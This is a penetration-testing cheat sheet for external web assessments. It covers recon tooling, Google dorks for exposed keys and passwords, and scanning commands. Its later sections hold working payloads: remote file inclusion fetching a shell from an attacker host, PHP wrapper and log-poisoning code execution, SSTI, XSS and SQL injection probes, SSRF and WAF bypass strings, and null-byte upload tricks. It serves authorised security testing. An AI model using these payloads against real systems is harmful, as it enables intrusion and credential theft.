# External Penetration Testing

## **Tools**

Automated

- [Sn1per](https://github.com/1N3/Sn1per)
- [AutoRecon](https://github.com/Tib3rius/AutoRecon)
- [Legion](https://github.com/carlospolop/legion)

Manual

- [Arsenal](https://github.com/Orange-Cyberdefense/arsenal)

```bash
# Install Sn1per
docker pull xerosecurity/sn1per
docker run -it xerosecurity/sn1per /bin/bash
# Manual install
git clone https://github.com/1N3/Sn1per && cd Sn1per && bash install.sh

# Install AutoRecon
sudo docker build -t tib3rius/autorecon .
# Manual install
apt install -y python3 python3-pip python3-venv
python3 -m pip install --user pipx && python3 -m pipx ensurepath
# on another terminal
apt install -y seclists curl enum4linux gobuster nbtscan nikto nmap onesixtyone oscanner smbclient smbmap smtp-user-enum snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf

# Install Legion
docker build -t legion .
docker run -it legion bash
# Manual install
git clone https://github.com/carlospolop/legion.git /opt/legion && cd /opt/legion/git && ./install.sh && ln -s /opt/legion/legion.py /usr/bin/legion

# Install Arsenal
git clone https://github.com/Orange-Cyberdefense/arsenal.git && cd arsenal && python3 setup.py install
```


--- 

## **Passive discovery**

dork on domain

```bash
inurl:example.com intitle:"index of"
inurl:example.com intitle:"index of /" "*key.pem"
inurl:example.com ext:log
inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv
inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
```

get url in file

```bash
cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
```

get js script

```bash
go get github.com/tomnomnom/waybackurls
waybackurls internet.org | grep "\.js" | uniq | sort
```

---

## **Active discovery**

### Services

```bash
nmap -sS -sV -O --top-ports 1000 --script=banner,nse,http-head -oA top_1000
nmap -sT -sV -O -p- -oA full_scan
nmap -sU -sV --top-ports 1000 --open -oA udp_1000
```

---

### Subdomains

```bash
amass enum -ip -brute -active -d <domain> 

gobuster dns -i  -w subdomains.txt -d <domain> 
```

check if subdomain exist

```bash
cat alive-subdomains.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
```

---

### Vhosts

```bash
nmap --script http-vhosts -p 80,8080,443 <target>

gobuster vhost -u <url> -w common-vhosts.txt

Burp Intruder (Host header)
```

---

### Urls

```bash
dirsearch -u <target> -e php,html,js,xml -x 500,403

wfuzz -c -z file,/root/wordlist.txt --hc 404 <target>/FUZZ

gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt -l -v

Burp Pro (Content Discovery)
```

URL finder

```bash
wget -qO- https://stackoverflow.com/ | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u
```
link finder

```bash
https://github.com/GerbenJavado/LinkFinder
 python linkfinder.py -i https://example.com -d -o cli
```

Directory listing recustive dump

```bash
wget -r --no-parent target.com/dir
```

Find asset and params

```bash
assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
```

---

## **LFI**

### Get shell

**RFI**

```bash
<target>?page=http://<attacker>/shell.php
<target>?page=\\<attacker>\<shared_folder>\shell.php
```

**PHP wrappers**

- PHP Expect

```bash
<target>?page=expect://id
<target>?page=expect://ls
```

- PHP Input 

Using a proxy like Burp, change the request to a POST request and use the wrapper "php://input", then put your php code into the request body :

```php
POST <targeturi>/<vulnrable_paramter>=php://input
host: <target>

<?php phpinfo(); ?>
```
**access_log**

If you find the access log, you can make a request with your php code 

**proc/self/environ**

Send the payload into User-Agent, and browse the /proc/self/environ file :

```bash
GET <target>?page=../../../proc/self/environ HTTP/1.1
User-Agent: <?php phpinfo(); ?>
```

## **Injections**

### SSTI

```bash
"<%= 7 * 7 %>"@example.com 
test+(${{7*7}})@example.com
```

---

### XSS

```bash
test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com
```

---

### SQLI

For http://site.com/?q=INJECT_HERE

```bash
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'   <== concat string
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
```

---

## **Bypass WAF**


SSRF localhost

```bash
http://127.1/
http://0000::1:80/
http://[::]:80/
http://2130706433/
http://whitelisted@127.0.0.1
http://0x7f000001/
http://017700000001
http://0177.00.00.01
```

X-Header

```bash
Accept: application/json, text/javascript, */*; q=0.01 
Host : localhost
X-Originating-IP: IP
X-Forwarded-For: IP
X-Remote-IP: IP
X-Remote-Addr: IP
X-Client-IP: IP
X-Host: IP
X-Forwared-Host: IP
```

NullByte

```bash
file.jpg%00shell.php
shell.php%00file.jpg
shell.php%00.jpg
```

---


## **Burp Extenders**

Extension|Description
---|----
`Retire.js`|[find vulnerable JavaScript libraries](https://github.com/PortSwigger/retire-js)
`Autorize`|[find privileges escalations by replaying admin requests as a simple user](https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f)